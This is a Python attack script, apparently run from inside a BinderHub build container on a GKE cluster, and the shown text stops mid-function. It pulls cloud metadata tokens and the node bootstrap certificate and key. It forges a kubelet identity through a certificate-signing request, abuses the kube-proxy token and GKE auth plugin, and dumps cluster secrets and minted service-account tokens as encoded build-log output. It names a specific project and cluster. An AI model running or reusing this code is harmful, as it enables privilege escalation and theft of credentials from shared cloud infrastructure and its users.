#!/usr/bin/env python3
"""BinderHub build-pod probe: metadata attributes + KSA token + kubelet-cert API access.

Runs inside the repo2docker build container (namespace bhs). Two modes:
  meta : dump GCE metadata attributes (kubeconfig, kube-env, configure-sh, user-data), identity JWT,
         KSA token file attempts and docker socket checks.
  api  : parse the kubeconfig attribute, write the kubelet client cert/key, query the in-cluster
         kube-apiserver read-only (nodes, pods, secrets, SelfSubjectRulesReview) and dump findings.
"""
import base64
import gzip
import json
import os
import re
import ssl
import sys
import urllib.request
import urllib.error

MD = "http://169.254.169.254/computeMetadata/v1/"
HDR = {"Metadata-Flavor": "Google"}
CHUNK = 2800
MAX_SECRET_LOG = 340000
_logged = 0


def out(s=""):
    global _logged
    s = str(s)
    sys.stdout.write(s + "\n")
    sys.stdout.flush()
    _logged += len(s) + 1


def chunked_p(label, data, width=CHUNK):
    out("--%s--%d--" % (label, len(data)))
    for i in range(0, len(data), width):
        out(data[i:i + width])
    out("--%s-end--" % label)


def md_get(path, timeout=10):
    req = urllib.request.Request(MD + path, headers=HDR)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, repr(e).encode()


def meta():
    out("===META2-BEGIN===")
    for p in ["project/project-id", "project/numeric-project-id", "instance/name", "instance/zone",
              "instance/id", "instance/service-accounts/default/email"]:
        st, b = md_get(p)
        out("-- %s [status:%s]\n%s" % (p, st, b.decode("utf8", "replace")))
    for p, lbl in [("instance/attributes/kubeconfig", "KUBECONFIG"),
                   ("instance/attributes/kube-env", "KUBEENV"),
                   ("instance/attributes/kubelet-config", "KUBELETCONFIG"),
                   ("instance/attributes/kube-labels", "KUBELABELS")]:
        st, b = md_get(p)
        chunked_p("%s status=%s b64" % (lbl, st), base64.b64encode(b).decode())
    for p, lbl in [("instance/attributes/configure-sh", "CONFIGURESH"),
                   ("instance/attributes/user-data", "USERDATA")]:
        st, b = md_get(p)
        chunked_p("%s status=%s raw" % (lbl, st), b.decode("utf8", "replace"))
    # remaining attribute values (short ones)
    for a in ["cluster-location", "cluster-name", "cluster-uid", "created-by", "instance-template",
              "google-compute-enable-pcid", "serial-port-logging-enable", "disable-legacy-endpoints",
              "gci-metrics-enabled", "gci-update-strategy"]:
        st, b = md_get("instance/attributes/" + a)
        out("--ATTR %s [status:%s]\n%s" % (a, st, b.decode("utf8", "replace")[:500]))
    # identity JWT (GCE OIDC)
    st, b = md_get("instance/service-accounts/default/identity?audience=binderhub-probe&format=full")
    out("--IDENTITY [status:%s]\n%s" % (st, b.decode("utf8", "replace")))
    st, b = md_get("instance/service-accounts/default/token")
    out("--TOKEN [status:%s]\n%s" % (st, b.decode("utf8", "replace")))
    # KSA token attempts
    out("--SA-DIR--")
    for d in ["/var/run/secrets/kubernetes.io/serviceaccount", "/var/run/secrets"]:
        try:
            out("%s: %s" % (d, os.listdir(d)))
        except Exception as e:
            out("%s: ERR %r" % (d, e))
    for f in ["/var/run/secrets/kubernetes.io/serviceaccount/token",
              "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
              "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"]:
        try:
            with open(f, "rb") as fh:
                b = fh.read()
            chunked_p("FILE %s len=%d" % (f, len(b)), b.decode("utf8", "replace"))
        except Exception as e:
            out("FILE %s: ERR %r" % (f, e))
    out("--SOCKETS--")
    for s in ["/var/run/docker.sock", "/run/docker.sock", "/var/run/bhs-bhs/docker-api/docker-api.sock",
              "/var/run/docker-api/docker-api.sock", "/var/run/docker.pid"]:
        out("%s: %s" % (s, os.path.exists(s)))
    out("--ENV--")
    for k, v in sorted(os.environ.items()):
        if re.search(r"KUBE|SA|GOOGLE|GCP|PROJECT|CLUSTER|BINDER|JUPYTER|DOCKER", k, re.I):
            out("%s=%s" % (k, v[:300]))
    out("===META2-END===")



def _kv(kubeenv, key):
    m = re.search(r"^" + key + r":\s*(\S+)\s*$", kubeenv, re.M)
    return base64.b64decode(m.group(1)) if m else None


def api():
    out("===API2-BEGIN===")
    st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
    st2, kvb = md_get("instance/attributes/kube-env", timeout=15)
    kv = kvb.decode("utf8", "replace")
    node = None
    m = re.search(r"instance/name", "x")
    stn, bn = md_get("instance/name")
    node = bn.decode().strip()
    ca = _kv(kv, "CA_CERT")
    bootc = _kv(kv, "TPM_BOOTSTRAP_CERT")
    bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
    open("/tmp/ca.crt", "wb").write(ca)
    open("/tmp/boot.crt", "wb").write(bootc)
    open("/tmp/boot.key", "wb").write(bootk)
    srv = re.search(r"^\s*server:\s*(\S+)", kc.decode("utf8", "replace"), re.M).group(1)
    out("SERVER %s NODE %s CACERT %d BOOTCERT %d" % (srv, node, len(ca or b""), len(bootc or b"")))
    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")

    def call(path, method="GET", body=None, ctx=ctxb, timeout=15):
        req = urllib.request.Request(srv + path, method=method, data=body,
                                     headers={"Content-Type": "application/json", "Accept": "application/json"})
        try:
            r = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return -1, repr(e).encode()

    # anonymous baseline
    st, b = call("/version", ctx=ctx0)
    out("ANON /version status=%s %s" % (st, b[:200].decode("utf8", "replace")))
    st, b = call("/api/v1/nodes", ctx=ctx0)
    out("ANON /api/v1/nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))

    # bootstrap cert identity
    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                       "spec": {"namespace": "bhs"}}).encode()
    st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
    out("BOOT-SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
    st, b = call("/api/v1/nodes")
    out("BOOT /api/v1/nodes status=%s len=%d %s" % (st, len(b), b[:300].decode("utf8", "replace")))

    # CSR for a kubelet client cert
    os.system("openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
    os.system("openssl req -new -key /tmp/nkey.pem -subj '/O=system:nodes/CN=system:node:%s' -out /tmp/n.csr 2>/dev/null" % node)
    if os.path.exists("/tmp/n.csr"):
        csr = base64.b64encode(open("/tmp/n.csr", "rb").read()).decode()
        cname = "bhs-probe-%s" % os.urandom(3).hex()
        cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
                            "metadata": {"name": cname},
                            "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
                                     "usages": ["digital signature", "key encipherment", "client auth"]}}).encode()
        st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
        out("CSR create status=%s %s" % (st, b[:400].decode("utf8", "replace")))
        cert = None
        for i in range(8):
            import time as _t
            _t.sleep(3)
            st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
            if st == 200:
                d = json.loads(b)
                c = d.get("status", {}).get("certificate")
                conds = d.get("status", {}).get("conditions")
                out("CSR poll %d conds=%s certlen=%s" % (i, conds, len(c) if c else 0))
                if c:
                    cert = base64.b64decode(c)
                    break
            else:
                out("CSR poll %d status=%s %s" % (i, st, b[:150].decode("utf8", "replace")))
        if cert:
            open("/tmp/ncrt.pem", "wb").write(cert)
            ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
            ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
            st, b = call("/api/v1/nodes", ctx=ctxn)
            out("NODE-CERT nodes status=%s len=%d" % (st, len(b)))
            if st == 200:
                for n in json.loads(b).get("items", []):
                    md = n.get("metadata", {})
                    stat = n.get("status", {})
                    addrs = [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])]
                    out("NODE %s addrs=%s cap=%s" % (md.get("name"), addrs,
                                                      json.dumps(stat.get("capacity", {}))[:300]))
            st, b = call("/api/v1/pods?limit=500", ctx=ctxn)
            out("NODE-CERT pods status=%s len=%d" % (st, len(b)))
            if st == 200:
                for p in json.loads(b).get("items", []):
                    md = p.get("metadata", {})
                    spec = p.get("spec", {})
                    secvols = []
                    for v in spec.get("volumes", []) or []:
                        if v.get("secret"):
                            secvols.append(v["secret"].get("secretName"))
                        if v.get("projected"):
                            for s2 in v["projected"].get("sources", []):
                                if s2.get("secret"):
                                    secvols.append(s2["secret"].get("name"))
                    out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s" % (
                        md.get("namespace"), md.get("name"), spec.get("nodeName"),
                        spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secvols))
            body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                               "spec": {"namespace": "bhs"}}).encode()
            st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, ctx=ctxn)
            out("NODE-CERT SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
            st, b = call("/api/v1/secrets?limit=500", ctx=ctxn)
            out("NODE-CERT secrets status=%s len=%d" % (st, len(b)))
            interesting = []
            if st == 200:
                d = json.loads(b)
                out("SECRET-COUNT %d" % len(d.get("items", [])))
                for s in d.get("items", []):
                    md = s.get("metadata", {})
                    name = md.get("name", "")
                    out("SEC %s|%s|%s|keys=%s" % (md.get("namespace"), name, s.get("type"),
                                                  sorted((s.get("data") or {}).keys())))
                    if re.search(r"docker|registr|gcp|google|cloud|sa-|service-account|token|tls|secret|hub|key|config|proxy", name, re.I):
                        interesting.append(s)
            for s in interesting:
                if _logged > MAX_SECRET_LOG:
                    out("SECRET-LOG-CAP-REACHED")
                    break
                md = s.get("metadata", {})
                out("===SECRET-FULL %s/%s type=%s" % (md.get("namespace"), md.get("name"), s.get("type")))
                raw = json.dumps(s).encode()
                out("--b64gzip len=%d--" % len(raw))
                out(base64.b64encode(gzip.compress(raw)).decode())
                out("--end--")
            # dump the default SA token secret of bhs explicitly
            for s in json.loads(b).get("items", []) if False else []:
                pass
    out("===API2-END===")


def api5():
    out("===API5-BEGIN===")
    st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
    st2, kvb = md_get("instance/attributes/kube-env", timeout=15)
    kv = kvb.decode("utf8", "replace")
    stn, bn = md_get("instance/name")
    node = bn.decode().strip()
    ca = _kv(kv, "CA_CERT"); bootc = _kv(kv, "TPM_BOOTSTRAP_CERT"); bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
    open("/tmp/ca.crt", "wb").write(ca); open("/tmp/boot.crt", "wb").write(bootc); open("/tmp/boot.key", "wb").write(bootk)
    srv = re.search(r"^\s*server:\s*(\S+)", kc.decode("utf8", "replace"), re.M).group(1)
    stt, tokb = md_get("instance/service-accounts/default/token")
    gt = json.loads(tokb.decode()).get("access_token", "")
    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")

    def call(path, method="GET", body=None, ctx=ctxb, auth=None, timeout=15, ctype="application/json"):
        h = {"Content-Type": ctype, "Accept": "application/json"}
        if auth:
            h["Authorization"] = "Bearer " + auth
        req = urllib.request.Request(srv + path, method=method, data=body, headers=h)
        try:
            r = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return -1, repr(e).encode()

    # ---- kube-proxy token: full node inventory ----
    msk = re.search(r"^KUBE_PROXY_TOKEN:\s*(\S+)\s*$", kv, re.M)
    kpt = msk.group(1).encode() if msk else None
    out("KPT %r" % (kpt,))
    if kpt:
        st, b = call("/api/v1/nodes", ctx=ctx0, auth=kpt)
        out("PROXY nodes status=%s len=%d" % (st, len(b)))
        if st == 200:
            out("--nodejson-b64gzip--")
            out(base64.b64encode(gzip.compress(b)).decode())
            d = json.loads(b)
            for n in d.get("items", []):
                md = n.get("metadata", {}); stat = n.get("status", {})
                out("NODE %s labels=%s cap=%s alloc=%s addrs=%s taints=%s conds=%s" % (
                    md.get("name"), json.dumps(md.get("labels", {}))[:900],
                    json.dumps(stat.get("capacity", {})), json.dumps(stat.get("allocatable", {})),
                    [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])],
                    [(t.get("key"), t.get("value"), t.get("effect")) for t in (n.get("spec", {}).get("taints") or [])],
                    [(c.get("type"), c.get("status")) for c in (stat.get("conditions") or [])]))
        st, b = call("/api/v1/services", ctx=ctx0, auth=kpt)
        out("PROXY services status=%s len=%d" % (st, len(b)))
        if st == 200:
            for sv in json.loads(b).get("items", [])[:80]:
                md = sv.get("metadata", {}); sp = sv.get("spec", {})
                out("SVC %s|%s|%s|ports=%s" % (md.get("namespace"), md.get("name"), sp.get("type"), [(p.get("name"), p.get("port"), p.get("targetPort")) for p in (sp.get("ports") or [])]))
    # ---- kubelet read-only pod inventory ----
    for host in ["10.214.0.56", "10.44.0.1"]:
        try:
            req = urllib.request.Request("http://%s:10255/pods" % host)
            r = urllib.request.urlopen(req, timeout=8); pb = r.read()
            out("KUBELET %s status=%s len=%d" % (host, r.status, len(pb)))
            pd = json.loads(pb)
            for p in pd.get("items", []):
                md = p.get("metadata", {}); spec = p.get("spec", {})
                secvols = []
                for v in spec.get("volumes", []) or []:
                    if v.get("secret"): secvols.append(v["secret"].get("secretName"))
                    if v.get("projected"):
                        for s2 in v["projected"].get("sources", []):
                            if s2.get("secret"): secvols.append(s2["secret"].get("name"))
                out("KPOD %s|%s|node=%s|sa=%s|secvols=%s|img=%s" % (md.get("namespace"), md.get("name"), spec.get("nodeName"), spec.get("serviceAccountName"), secvols, [c.get("image") for c in (spec.get("containers") or [])]))
            out("--podjson-b64gzip--"); out(base64.b64encode(gzip.compress(pb)).decode())
            break
        except Exception as e:
            out("KUBELET %s ERR %r" % (host, e))
    # ---- plugin vm-token mode ----
    import subprocess
    eci = json.dumps({"apiVersion": "client.authentication.k8s.io/v1beta1", "kind": "ExecCredential",
                      "spec": {"cluster": {"server": srv, "certificate-authority-data": base64.b64encode(ca).decode()}}})
    envp = dict(os.environ); envp["KUBERNETES_EXEC_INFO"] = eci
    for mode, extra in [("vm-token", []), ("alt-token", ["-alt-token-url", "http://169.254.169.252:987"])]:
        os.system("mkdir -p /tmp/pki-%s" % mode)
        try:
            pr = subprocess.run(["./gke-exec-auth-plugin", "-mode", mode, "-cache-dir", "/tmp/pki-" + mode,
                                 "-kube-ca-certificate", "/tmp/ca.crt", "-v=6"] + extra,
                                cwd="/", env=envp, capture_output=True, timeout=60)
            out("PLUGIN %s rc=%s" % (mode, pr.returncode))
            out("--stdout--\n%s" % pr.stdout.decode("utf8", "replace")[:4000])
            out("--stderr--\n%s" % pr.stderr.decode("utf8", "replace")[:4000])
            try:
                cred = json.loads(pr.stdout.decode())
                tok = cred.get("status", {}).get("token")
                if tok:
                    out("PLUGIN-TOKEN len=%d" % len(tok))
                    st, b = call("/api/v1/nodes", ctx=ctx0, auth=tok)
                    out("PLUGIN-TOKEN nodes status=%s %s" % (st, b[:300].decode("utf8", "replace")))
            except Exception as e:
                out("PLUGIN cred parse %r" % e)
        except Exception as e:
            out("PLUGIN %s ERR %r" % (mode, e))
        for root, dirs, files in os.walk("/tmp/pki-" + mode):
            for f in files:
                fp = os.path.join(root, f)
                try:
                    out("PKIFILE %s len=%d %s" % (fp, os.path.getsize(fp), open(fp, "rb").read()[:120].decode("utf8", "replace")))
                except Exception: pass
    # ---- CSR create + poll ----
    os.system("cp /client.key /tmp/nkey.pem 2>/dev/null || openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
    os.system("openssl req -new -key /tmp/nkey.pem -subj '/O=system:nodes/CN=system:node:%s' -out /tmp/n.csr 2>/dev/null" % node)
    csr = base64.b64encode(open("/tmp/n.csr", "rb").read()).decode()
    cname = "bhs-p5-%s" % os.urandom(3).hex()
    cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
                        "metadata": {"name": cname},
                        "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
                                 "usages": ["digital signature", "key encipherment", "client auth"]}}).encode()
    st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
    out("CSR create status=%s %s" % (st, b[:200].decode("utf8", "replace")))
    import time as _t
    cert = None
    for i in range(12):
        _t.sleep(3)
        st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
        if st == 200:
            d = json.loads(b); c = d.get("status", {}).get("certificate")
            out("poll %d conds=%s certlen=%s" % (i, d.get("status", {}).get("conditions"), len(c) if c else 0))
            if c:
                cert = base64.b64decode(c); break
        else:
            out("poll %d status=%s" % (i, st))
    if cert:
        open("/tmp/ncrt.pem", "wb").write(cert)
        ctxn = ssl.create_default_context(cafile="/tmp/ca.crt"); ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
        st, b = call("/api/v1/nodes", ctx=ctxn); out("NODECERT nodes status=%s len=%d" % (st, len(b)))
        st, b = call("/api/v1/secrets?limit=500", ctx=ctxn); out("NODECERT secrets status=%s len=%d" % (st, len(b)))
        if st == 200:
            out("--secrets-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode())
    out("===API5-END===")


def plugin():
    """Run the GKE-provided gke-exec-auth-plugin in vm-token/alt-token mode to mint a kubelet
    client credential via the kubelet-nodepool-bootstrap CSR flow, then use it on the apiserver
    and the node kubelet."""
    import subprocess, threading, http.server, datetime, urllib.parse
    out("===PLUGIN-BEGIN===")
    st, kvb = md_get("instance/attributes/kube-env", timeout=15)
    kv = kvb.decode("utf8", "replace")
    node = md_get("instance/name")[1].decode().strip()
    nodeip = md_get("instance/network-interfaces/0/ip")[1].decode().strip()
    out("NODE %s NODEIP %s KUBEENV status=%s len=%d" % (node, nodeip, st, len(kv)))
    for a in ["cluster-name", "cluster-location", "cluster-nodepool", "cluster-tenantid",
              "gke-api-endpoint", "kube-env-path", "instance-template", "project-id"]:
        s, b = md_get("instance/attributes/" + a)
        out("ATTR %s [%s] %s" % (a, s, b[:300].decode("utf8", "replace")))
    out("SCOPES %s" % md_get("instance/service-accounts/default/scopes")[1].decode("utf8", "replace")[:300])
    ca = _kv(kv, "CA_CERT"); bootc = _kv(kv, "TPM_BOOTSTRAP_CERT"); bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
    open("/tmp/ca.crt", "wb").write(ca or b"")
    open("/tmp/boot.crt", "wb").write(bootc or b"")
    open("/tmp/boot.key", "wb").write(bootk or b"")
    m = re.search(r"^KUBERNETES_MASTER_NAME:\s*(\S+)\s*$", kv, re.M)
    master = m.group(1) if m else "10.214.0.4"
    srv = "https://" + master
    out("SERVER %s CACERT %d BOOTCERT %d BOOTKEY %d" % (srv, len(ca or b""), len(bootc or b""), len(bootk or b"")))
    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")

    def call(path, method="GET", body=None, ctx=None, auth=None, timeout=20, ctype="application/json"):
        h = {"Content-Type": ctype, "Accept": "application/json"}
        if auth:
            h["Authorization"] = "Bearer " + auth
        req = urllib.request.Request(srv + path, method=method, data=body, headers=h)
        try:
            r = urllib.request.urlopen(req, context=ctx or ctx0, timeout=timeout)
            return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return -1, repr(e).encode()

    eci = json.dumps({"apiVersion": "client.authentication.k8s.io/v1beta1", "kind": "ExecCredential",
                      "spec": {"cluster": {"server": srv, "certificate-authority-data": base64.b64encode(ca or b"").decode()}}})
    envp = dict(os.environ); envp["KUBERNETES_EXEC_INFO"] = eci

    def run_plugin(tag, args):
        os.system("mkdir -p /tmp/pki-%s && chmod 700 /tmp/pki-%s" % (tag, tag))
        try:
            pr = subprocess.run(["/gke-exec-auth-plugin"] + args + ["-cache-dir", "/tmp/pki-" + tag,
                                 "-kube-ca-certificate", "/tmp/ca.crt", "-v=8"],
                                cwd="/", env=envp, capture_output=True, timeout=240)
        except Exception as e:
            out("PLUGIN %s EXC %r" % (tag, e)); return None
        out("PLUGIN %s rc=%s" % (tag, pr.returncode))
        out("--stdout--\n%s" % pr.stdout.decode("utf8", "replace")[:6000])
        out("--stderr--\n%s" % pr.stderr.decode("utf8", "replace")[-14000:])
        for root, dirs, files in os.walk("/tmp/pki-" + tag):
            for f in files:
                fp = os.path.join(root, f)
                try:
                    b = open(fp, "rb").read()
                    out("PKIFILE %s len=%d %s" % (fp, len(b), b[:80].decode("utf8", "replace")))
                except Exception:
                    pass
        try:
            return json.loads(pr.stdout.decode())
        except Exception:
            return None

    creds = {}
    for tag, args in [("vm", ["-mode", "vm-token"]),
                      ("alt", ["-mode", "alt-token", "-alt-token-url", "http://127.0.0.1:8765/token", "-alt-token-body", "{}"])]:
        if tag == "alt":
            class H(http.server.BaseHTTPRequestHandler):
                def _r(self):
                    n = int(self.headers.get("Content-Length") or 0)
                    body = self.rfile.read(n) if n else b""
                    out("ALT-REQ %s %s hdrs=%s body=%s" % (self.command, self.path, dict(self.headers), body[:400]))
                    try:
                        tok = json.loads(md_get("instance/service-accounts/default/token")[1].decode()).get("access_token", "")
                    except Exception:
                        tok = ""
                    exp = (datetime.datetime.utcnow() + datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
                    resp = json.dumps({"accessToken": tok, "expireTime": exp}).encode()
                    self.send_response(200); self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(resp))); self.end_headers(); self.wfile.write(resp)

                def do_GET(self):
                    self._r()

                def do_POST(self):
                    self._r()

                def log_message(self, *a):
                    pass
            srvx = http.server.ThreadingHTTPServer(("127.0.0.1", 8765), H)
            threading.Thread(target=srvx.serve_forever, daemon=True).start()
        c = run_plugin(tag, args)
        if tag == "alt":
            try:
                srvx.server_close()
            except Exception:
                pass
        if not c:
            continue
        stt = c.get("status") or {}
        tok = stt.get("token"); cert = stt.get("clientCertificateData"); key = stt.get("clientKeyData")
        out("CRED %s token=%s cert=%s key=%s" % (tag, bool(tok), bool(cert), bool(key)))
        if tok:
            creds[tag + "-token"] = ("token", tok)
        if cert and key:
            open("/tmp/%s.crt" % tag, "wb").write(cert.encode())
            open("/tmp/%s.key" % tag, "wb").write(key.encode())
            creds[tag + "-cert"] = ("cert", (cert, key))

    for name, (kind, val) in creds.items():
        if kind == "token":
            s, b = call("/api/v1/nodes", auth=val, timeout=20)
            out("TEST %s nodes status=%s %s" % (name, s, b[:200].decode("utf8", "replace")))
            s, b = call("/api/v1/pods?limit=5", auth=val, timeout=20)
            out("TEST %s pods status=%s %s" % (name, s, b[:200].decode("utf8", "replace")))
        else:
            ctxc = ssl.create_default_context(cafile="/tmp/ca.crt")
            open("/tmp/testcrt.pem", "wb").write(val[0].encode()); open("/tmp/testkey.pem", "wb").write(val[1].encode())
            ctxc.load_cert_chain("/tmp/testcrt.pem", "/tmp/testkey.pem")
            s, b = call("/api/v1/nodes", ctx=ctxc)
            out("TEST %s nodes status=%s %s" % (name, s, b[:200].decode("utf8", "replace")))

    nctx = None
    for name, (kind, val) in creds.items():
        if kind == "cert":
            c2 = ssl.create_default_context(cafile="/tmp/ca.crt")
            open("/tmp/ncrt.pem", "wb").write(val[0].encode()); open("/tmp/nkey.pem", "wb").write(val[1].encode())
            c2.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
            s, b = call("/api/v1/nodes", ctx=c2)
            if s == 200:
                nctx = c2
                out("USING cert %s" % name)
                break

    kpt = (_kv(kv, "KUBE_PROXY_TOKEN") or b"").decode()
    if kpt:
        s, b = call("/api/v1/nodes", auth=kpt, timeout=30)
        out("PROXY nodes status=%s len=%d" % (s, len(b)))
        if s == 200:
            out("--nodejson-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--nodejson-end--")
            try:
                for n in json.loads(b).get("items", []):
                    md = n.get("metadata", {}); stt2 = n.get("status", {})
                    out("NODE %s labels=%s cap=%s addrs=%s taints=%s" % (md.get("name"),
                        json.dumps(md.get("labels", {}))[:1200], json.dumps(stt2.get("capacity", {})),
                        [(a.get("type"), a.get("address")) for a in stt2.get("addresses", [])],
                        [(t.get("key"), t.get("value"), t.get("effect")) for t in (n.get("spec", {}).get("taints") or [])]))
            except Exception as e:
                out("NODEPARSE %r" % e)
        s, b = call("/api/v1/services", auth=kpt, timeout=20)
        out("PROXY services status=%s len=%d" % (s, len(b)))
        if s == 200:
            for sv in json.loads(b).get("items", [])[:100]:
                md = sv.get("metadata", {}); sp = sv.get("spec", {})
                out("SVC %s|%s|%s|ports=%s" % (md.get("namespace"), md.get("name"), sp.get("type"),
                    [(p.get("name"), p.get("port")) for p in (sp.get("ports") or [])]))
        s, b = call("/api/v1/namespaces/kube-system/configmaps", auth=kpt, timeout=20)
        out("PROXY kubesystem configmaps status=%s len=%d" % (s, len(b)))

    if nctx is None:
        out("NO NODE CERT AVAILABLE")
    else:
        def ncall(path, method="GET", body=None, timeout=25):
            return call(path, method=method, body=body, ctx=nctx, timeout=timeout)

        body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                           "spec": {"namespace": "bhs"}}).encode()
        s, b = ncall("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
        out("NODE-SSRR status=%s\n%s" % (s, b[:6000].decode("utf8", "replace")))
        s, b = ncall("/api/v1/nodes/%s" % node)
        out("NODE own-node status=%s len=%d %s" % (s, len(b), b[:300].decode("utf8", "replace")))
        s, b = ncall("/api/v1/nodes")
        out("NODE nodes status=%s len=%d" % (s, len(b)))
        pods = []
        for path in ["/api/v1/pods?fieldSelector=" + urllib.parse.quote("spec.nodeName=" + node) + "&limit=500",
                     "/api/v1/pods?limit=500"]:
            s, b = ncall(path)
            out("NODE %s status=%s len=%d %s" % (path.split("?")[0] + "?" + path.split("?")[1][:60], s, len(b), b[:200].decode("utf8", "replace")))
            if s == 200:
                out("--pods-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--pods-end--")
                try:
                    pods = json.loads(b).get("items", [])
                except Exception:
                    pass
                break
        secretrefs = []; sapairs = []
        for p in pods:
            md = p.get("metadata", {}); ns = md.get("namespace"); spec = p.get("spec", {})
            secs = []
            for v in (spec.get("volumes") or []):
                if v.get("secret"):
                    secs.append(v["secret"].get("secretName"))
                for src in (v.get("projected", {}) or {}).get("sources", []) or []:
                    if src.get("secret"):
                        secs.append(src["secret"].get("name"))
            for c in (spec.get("containers") or []) + (spec.get("initContainers") or []):
                for e in (c.get("env") or []):
                    if e.get("valueFrom", {}).get("secretKeyRef"):
                        secs.append(e["valueFrom"]["secretKeyRef"].get("name"))
                for ef in (c.get("envFrom") or []):
                    if ef.get("secretRef"):
                        secs.append(ef["secretRef"].get("name"))
            out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s|imgs=%s" % (ns, md.get("name"), spec.get("nodeName"),
                spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secs,
                [c.get("image") for c in (spec.get("containers") or [])]))
            if ns and spec.get("serviceAccountName"):
                sapairs.append((ns, spec["serviceAccountName"]))
            for sname in set(x for x in secs if x):
                secretrefs.append((ns, sname))
        for ns, sname in sorted(set(secretrefs)):
            s, b = ncall("/api/v1/namespaces/%s/secrets/%s" % (ns, sname))
            out("SECRET %s/%s status=%s len=%d" % (ns, sname, s, len(b)))
            if s == 200:
                out("--secret-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--secret-end--")
                try:
                    d = json.loads(b)
                    out("SECRET-KEYS %s/%s type=%s keys=%s" % (ns, sname, d.get("type"), sorted((d.get("data") or {}).keys())))
                except Exception:
                    pass
        for ns, sa in sorted(set(sapairs)):
            body = json.dumps({"apiVersion": "authentication.k8s.io/v1", "kind": "TokenRequest",
                               "spec": {"audiences": ["https://container.googleapis.com/v1/projects/220541406316/zones/europe-west10-a/clusters/jup-test"], "expirationSeconds": 3600}}).encode()
            s, b = ncall("/api/v1/namespaces/%s/serviceaccounts/%s/token" % (ns, sa), "POST", body)
            out("SATOKEN %s/%s status=%s %s" % (ns, sa, s, b[:300].decode("utf8", "replace")))
            if s == 201 or s == 200:
                out("--satoken-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--satoken-end--")
        for ns in ["bhs", "kube-system"]:
            for res in ["secrets", "configmaps", "serviceaccounts"]:
                s, b = ncall("/api/v1/namespaces/%s/%s?limit=500" % (ns, res))
                out("LIST %s/%s status=%s len=%d %s" % (ns, res, s, len(b), b[:150].decode("utf8", "replace")))
                if s == 200:
                    out("--list-%s-%s-b64gzip--" % (ns, res)); out(base64.b64encode(gzip.compress(b)).decode()); out("--list-end--")

    ctxun = ssl._create_unverified_context()
    for url in ["http://%s:10255/pods" % nodeip, "http://%s:10255/configz" % nodeip]:
        try:
            r = urllib.request.urlopen(url, timeout=8); b = r.read()
            out("KUBELET-RO %s status=%s len=%d" % (url, r.status, len(b)))
            out("--kubelet-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-end--")
        except Exception as e:
            out("KUBELET-RO %s ERR %r" % (url, e))
    if nctx is not None:
        for url in ["https://%s:10250/pods" % nodeip, "https://%s:10250/configz" % nodeip]:
            try:
                r = urllib.request.urlopen(urllib.request.Request(url), context=nctx, timeout=8); b = r.read()
                out("KUBELET-TLS %s status=%s len=%d" % (url, r.status, len(b)))
